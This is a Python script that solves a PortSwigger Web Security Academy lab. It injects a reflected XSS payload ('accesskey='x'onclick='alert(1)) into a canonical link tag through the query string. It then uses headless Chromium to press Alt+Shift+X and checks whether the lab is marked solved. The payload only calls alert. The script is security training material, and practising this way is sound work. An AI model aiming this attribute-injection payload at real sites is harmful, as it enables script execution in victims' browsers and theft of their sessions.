#!/usr/bin/env python3
"""
Reflected XSS in canonical link tag
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 17-reflected-xss-canonical-link-tag.md

What this does:
    Injects 'accesskey='x'onclick='alert(1) into the query string, which lands
    inside the page's <link rel="canonical" href="..."> tag and adds an
    accesskey + onclick pair to an otherwise inert element. A headless Chromium
    instance then navigates to the URL and simulates the Alt+Shift+X keyboard
    shortcut (Chrome on Windows/Linux) to fire the injected onclick handler --
    this is the "only possible in Chrome" solve PortSwigger's own lab notes call out.

Usage:
    python 17-reflected-xss-canonical-link-tag.py <lab-url>
    e.g. python 17-reflected-xss-canonical-link-tag.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx playwright
    playwright install chromium
"""

import sys
import httpx

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    warmup = client.get(lab_url)
    session = warmup.cookies.get("session", "")
    domain = lab_url.split("/")[2]

    # Literal payload for reference: 'accesskey='x'onclick='alert(1)
    url = f"{lab_url}/?'accesskey='x'onclick='alert(1)"
    print(f"[*] Request: GET {url}")

    if sync_playwright is None:
        print("[!] playwright not installed -- cannot simulate the Alt+Shift+X shortcut.")
        print(f"    Install it, or open this URL yourself and press Alt+Shift+X: {url}")
        return

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        page.goto(url, timeout=15000)
        page.wait_for_timeout(1000)
        # accesskey='x' binds Alt+Shift+X (Chrome/Windows/Linux) to the injected onclick
        page.keyboard.press("Alt+Shift+X")
        page.wait_for_timeout(2000)
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() fired via accesskey: {alert_fired}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
